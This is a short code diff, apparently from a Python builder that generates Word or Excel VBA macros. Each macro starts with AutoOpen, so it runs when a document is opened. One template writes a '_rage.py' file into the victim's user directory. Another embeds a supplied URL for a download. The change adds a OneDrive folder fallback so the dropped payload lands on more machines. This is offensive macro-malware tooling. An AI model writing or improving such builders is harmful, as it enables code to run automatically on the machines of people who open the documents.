@@ -253,7 +253,17 @@ while True:
 
 
     vba =  """Sub AutoOpen()
-    ChDir ("C:/Users/" & Environ("username"))
+    folder = "C:/Users/" & Environ("username")
+
+    Exists = Dir(folder, vbDirectory)
+ 
+    If Exists = "" Then
+        folder = "C:/Users/OneDrive/" & Environ("username")
+    
+    End If
+    
+    ChDir (folder)
+    
     myFile = "_rage.py"
     Open myFile For Output As #1
     """
@@ -278,7 +288,16 @@ End Sub"""
 def mkcustomscript(link: str, extension: str) -> str:
 
     return f"""Sub AutoOpen()
-    ChDir ("C:/Users/" & Environ("username"))
+    folder = "C:/Users/" & Environ("username")
+
+    Exists = Dir(folder, vbDirectory)
+ 
+    If Exists = "" Then
+        folder = "C:/Users/OneDrive/" & Environ("username")
+    
+    End If
+    
+    ChDir (folder)
     
     Dim URL As String
     URL = "{link}"
